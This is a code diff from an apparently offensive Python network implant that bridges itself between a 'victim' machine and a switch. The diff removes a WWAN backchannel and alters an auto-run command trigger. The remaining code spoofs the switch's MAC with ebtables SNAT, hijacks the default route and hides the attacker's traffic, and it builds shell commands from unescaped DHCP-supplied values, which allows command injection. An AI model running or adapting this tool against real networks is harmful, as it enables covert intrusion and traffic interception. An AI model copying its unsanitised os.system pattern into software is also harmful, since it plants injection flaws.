@@ -322,21 +322,6 @@ class Netfilter:
         os.system("ebtables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 
         os.system("iptables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 
         os.system("arptables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 
-#        if config['wwan_int']:
-#            while os.path.exists('/sys/class/net/' + config['wwan_int']) == False:
-#                logging.info("[*] wwan is not up yet, trying again")
-#                time.sleep(2)
-#        os.system("ebtables -A OUTPUT -o %s -j ACCEPT" % config['wwan_int']) 
-#        os.system("iptables -A OUTPUT -o %s -j ACCEPT" % config['wwan_int']) 
-#        os.system("arptables -A OUTPUT -o %s -j ACCEPT" % config['wwan_int']) 
-            #cheat and just sleep a few seconds between commands to make sure the device is ready
-#            time.sleep(5)
-#            os.system("ifconfig %s up" % config['wwan_int']) 
-#            time.sleep(5)
-#            os.system("mmcli -m 0 --simple-connect=\"apn=%s\"" % config['wwan_apn']) 
-#            time.sleep(5)
-#            os.system("dhclient %s" % config['wwan_int']) 
-
 
     def flushtables(self):
         os.system("iptables -F")
@@ -398,29 +383,14 @@ class Netfilter:
         logging.info("iptables -A OUTPUT -o %s -s %s -j ACCEPT" %
                   (self.bridge.bridgename, "169.254.66.77"))
 
-        if config['wwan_int']:
-            #when using a wwan connection, the default route is already set from dhclient
-            #we just need to add routes to private networks via our bridge interface
-            logging.info("[*] adding a route to the 10.0.0.0/8 space")
-            os.system("ip route add 10.0.0.0/8 via 169.254.66.55 dev mibr")
-            logging.info("ip route add 10.0.0.0/8 via 169.254.66.55 dev mibr")
-
-            logging.info("[*] adding a route to the 192.168.0.0/16 space")
-            os.system("ip route add 192.168.0.0/16 via 169.254.66.55 dev mibr")
-            logging.info("ip route add 192.168.0.0/16 via 169.254.66.55 dev mibr")
-
-            logging.info("[*] adding a route to the 172.16.0.0/12 space")
-            os.system("ip route add 172.16.0.0/12 via 169.254.66.55 dev mibr")
-            logging.info("ip route add 172.16.0.0/12 via 169.254.66.55 dev mibr")
-        else:
-            #clear out any default route to the network
-            logging.info("[*] deleting default route")
-            os.system("ip route del default")
-            logging.info("ip route del default")
-            #set our default route to the IP we gave the switch's MAC on our bridge interface so we can start routing traffic to other hosts
-            logging.info("[*] adding new route")
-            os.system("ip route add default via 169.254.66.55 dev mibr")
-            logging.info("ip route add default via 169.254.66.55 dev mibr")
+        #clear out any default route to the network
+        logging.info("[*] deleting default route")
+        os.system("ip route del default")
+        logging.info("ip route del default")
+        #set our default route to the IP we gave the switch's MAC on our bridge interface so we can start routing traffic to other hosts
+        logging.info("[*] adding new route")
+        os.system("ip route add default via 169.254.66.55 dev mibr")
+        logging.info("ip route add default via 169.254.66.55 dev mibr")
 
         #set up a basic single-step traceroute to find the gateway IP as it is commonly missing at this point. We need this so the victim doesn't get kicked off the network
         #use google's dns as the 'destination' for this probing packet
@@ -442,14 +412,12 @@ class Netfilter:
             logging.info(my_options)
 
             try:
-                #resolv += "search " + my_options['domain'] + "\n"
                 logging.info("echo domain %s >> /etc/resolv.conf" % my_options['domain'])
                 os.system(r"echo domain %s >> /etc/resolv.conf" % re.sub(r'[\x00]',r'',my_options['domain']))
             except:
                 logging.info("no domain listed")
 
             try:
-                #resolv += "nameserver " + my_options['name_server'] + "\n"
                 logging.info("echo nameserver %s >> /etc/resolv.conf" % my_options['name_server'])
                 os.system(r"echo nameserver %s >> /etc/resolv.conf" % re.sub(r'[\x00]',r'',my_options['name_server']))
             except:
@@ -466,12 +434,6 @@ class Netfilter:
                 logging.info("Gateway IP: %s" % self.subnet.gatewayip)
 
         logging.info("[*] Hiding communication between us and the victim")
-#        os.system("echo %s >> /etc/resolv.conf" % resolv)
-#        if self.subnet.dns_server:
-#            os.system("echo nameserver %s >> /etc/resolv.conf" % self.subnet.dns_server)
-#        os.system("echo nameserver %s >> /etc/resolv.conf" % self.subnet.gatewayip)
-#        if self.subnet.domain_name:
-#            os.system("echo domain %s >> /etc/resolv.conf" % self.subnet.domain_name)
         #tag all communication from the bridge towards the victim with the switch's MAC address
         os.system("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
                   (self.bridge.ifmacs[self.bridge.clientsiteint], self.bridge.clientsiteint, self.subnet.get_gatewaymac()))
@@ -501,7 +463,6 @@ class Netfilter:
         #set our default route to the IP we gave the switch's MAC on our bridge interface so we can start routing traffic to other hosts
         os.system("ip route add default via 169.254.66.55 dev mibr")
         logging.info("ip route add default via 169.254.66.55 dev mibr")
-        #should have worked above but maybe not for some reason. Let's check this out
 #        os.system("ebtables -A OUTPUT -o wlan0 -j ACCEPT") 
 #        os.system("iptables -A OUTPUT -o wlan0 -j ACCEPT") 
 #        os.system("arptables -A OUTPUT -o wlan0 -j ACCEPT") 
@@ -513,7 +474,7 @@ class Netfilter:
         logging.info("arptables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 
 
 
-        if config['auto_run']['switch'].upper() == 'TRUE':
+        if config['auto_run']['switch'].upper() == 'ON':
             myshell = subprocess.call(config['auto_run']['command'])
 
         print """
@@ -648,7 +609,6 @@ def main():
 
     # arp setup
     while True:
-        #f = open('/root/subnetinfo', 'w')
         f = open(os.path.dirname(os.path.abspath(__file__)) + '/logs/subnetinfo', 'w')
         f.write(str(subnet))
         f.close()
